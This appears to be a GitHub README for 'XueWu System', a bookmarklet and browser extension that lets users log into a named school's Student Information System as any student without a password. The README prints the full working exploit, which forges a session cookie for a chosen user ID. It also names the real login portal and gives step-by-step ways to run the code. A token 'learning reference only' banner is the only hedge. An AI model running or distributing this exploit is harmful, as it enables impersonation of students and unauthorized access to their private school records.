# XueWu System

***Zhuang ShengLi Database Presented***

A system written in Javascript that allows users to log in into Student Information System with any identity without password.

## Running It

There are 3 ways to run the script

1. Running using `javascipt:` URL
	1. Copy the following URL:
      
      ```javascipt
      javascript:(function(){/*XueWu System Core Javascript. (C)opyright 2024 KCISHackers. All Rights reserved. Visit: https://www.github.com/KCISHacker/XueWuSystem for more info.*/function hack(id){var date=new Date();date.setTime(date.getTime()+3600000);for(let i=0;i<100;i++)var oldest_time=new Date(0);for(let i=0;i<100;i++)document.cookie='cookie'+i+'=0;expires='+oldest_time.toUTCString();document.cookie="DSAI="+id+";expires="+date.toGMTString()+";path=/";fetch(window.location.origin+'/DSAI/Query/Form_ListDetention?strKeyWord1=').then(response=>response.json()).catch(error=>(function(){console.error(error);if(error.name=='SyntaxError'){alert(id+' seems not exist. Check your spelling.');return;}alert("Error while hacking "+id+"! "+error);successed=false;}()))}console.log("Hello from XueWuSystem: Ciallo～(∠・ω< )⌒★");console.log("Visit: https://www.github.com/KCISHacker/XueWuSystem for more info");if(document.getElementById("hacked")){alert('This page had already been hacked! Do not run twice!');}document.getElementsByClassName("main_logout")[0].innerText="hacked by 学武系统hacker";document.getElementsByClassName("ui-input-text ui-body-inherit ui-corner-all ui-shadow-inset")[1].innerHTML="<div style=\"color:red\">This program is for learning reference only, rather than abusing, or you'll take the risk!</div>";document.getElementById("UserId").addEventListener("keyup",function(event){if(event.keyCode===13){event.preventDefault();btn_onclick();}});document.getElementsByName('btn_s')[0].removeEventListener("click", function(){});function btn_onclick(){if(document.getElementById("UserId").value==''){alert('Username field cannot be empty!');return;}hack(document.getElementById("UserId").value);window.location.href="/DSAI/Home";}document.getElementsByName('btn_s')[0].addEventListener("click",btn_onclick);document.body.innerHTML += '<div id="hacked"></div>';}())
      ```
      
      2. Visit this URL when you are browsing [Student Information System Log In Page](https://portal.kcisec.com/China/Account/LogIn) tab.
      
      3. You can save this URL as a bookmark and use it anytime.

2. Installing as a browser extension  (may not work on Safari or FireFox):
   
   1. Go to [Extension Setting](about://extensions) page in your brower .
   
   2. Enable `Developer Mode` (It should appear somewhere on the page).
   
   3. After enabling this options, you should see a `Load Unpackaged` button on the page.
   
   4. Click it and specify the path of the folder `Chrome Extension` contained in the Git repository.
   
   5. It is now installed on your brower. Do not move, rename, or delete the `Chrome Extension` folder after installation.

3. Running the script manually:
   
   1. Open the JavaScript file named "core.js" from the Git repository.
   2. The file contains comments explaining the purpose of each function.
   3. Try running the functions in the `[Developer Tools](https://en.wikipedia.org/wiki/Web_development_tools) Console` of your browser while on the [Student Information System Log In Page](https://portal.kcisec.com/China/Account/LogIn).

## License

MIT License

Copyright (c) 2024 KCISHackers

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
